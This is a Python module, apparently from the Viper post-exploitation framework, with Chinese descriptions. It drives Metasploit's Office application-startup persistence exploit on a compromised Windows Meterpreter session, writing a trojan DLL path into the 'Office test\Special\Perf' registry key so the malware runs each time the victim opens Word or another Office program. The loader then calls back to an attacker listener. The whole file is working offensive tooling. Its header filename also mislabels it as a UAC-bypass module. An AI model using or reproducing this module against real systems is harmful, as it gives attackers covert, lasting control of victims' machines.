# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows Office应用启动持久化"
    DESC = "通过在注册表\n" \
           "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf\n" \
           "键中写入木马文件路径实现持久化.\n" \
           "每当运行Office程序(如打开Word文档)会自动执行木马文件\n" \
           "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1137"]  # ATTCK向量
    README = ["https://www.yuque.com/funnywolfdoc/viperdoc/qg1nnl"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1137/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_office_application_startup"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Meterpreter类型的Session"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,建议选择windows平台的handler"

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("DLL路径: {}\n用户下次打开Office应用（如打开Word文档）生效".format(data))
            self.cache_handler()
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
